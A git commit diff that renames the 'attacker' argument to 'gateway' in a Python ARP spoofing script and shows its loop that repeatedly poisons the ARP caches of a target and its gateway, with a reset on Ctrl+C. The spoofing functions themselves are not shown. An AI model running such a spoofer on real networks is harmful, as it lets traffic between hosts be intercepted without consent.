42ef60a0dfdd90bdee5fcb33c005eee484ea0a41
nadiaschutz <nadiaikon@gmail.com>
2022-08-03 06:43:53 -0400

    changing name attacker to gateway

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -7,12 +7,12 @@ import argparse
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", help="Target IP")
-    parser.add_argument("-a", "--attacker", dest="attacker", help="Attacker IP")
+    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
     options = parser.parse_args()
     if not options.target:
         parser.error("[-] Please specify a target IP, use --help for more info")
-    if not options.attacker:
-        parser.error("[-] Please specify an attacker IP, use --help for more info")
+    if not options.gateway:
+        parser.error("[-] Please specify an gateway IP, use --help for more info")
     return options
 
 
@@ -42,12 +42,12 @@ options = get_arguments()
 sent_packets_count = 0
 try:
     while True:
-        spoof(options.target, options.attacker)
-        spoof(options.attacker, options.target)
+        spoof(options.target, options.gateway)
+        spoof(options.gateway, options.target)
         sent_packets_count+=2
         print("\r[+] Pakets sent: " + str(sent_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[-] Detected CTRL+C, resetting ARP tables")
-    restore(options.target, options.attacker)
-    restore(options.attacker, options.target)
+    restore(options.target, options.gateway)
+    restore(options.gateway, options.target)
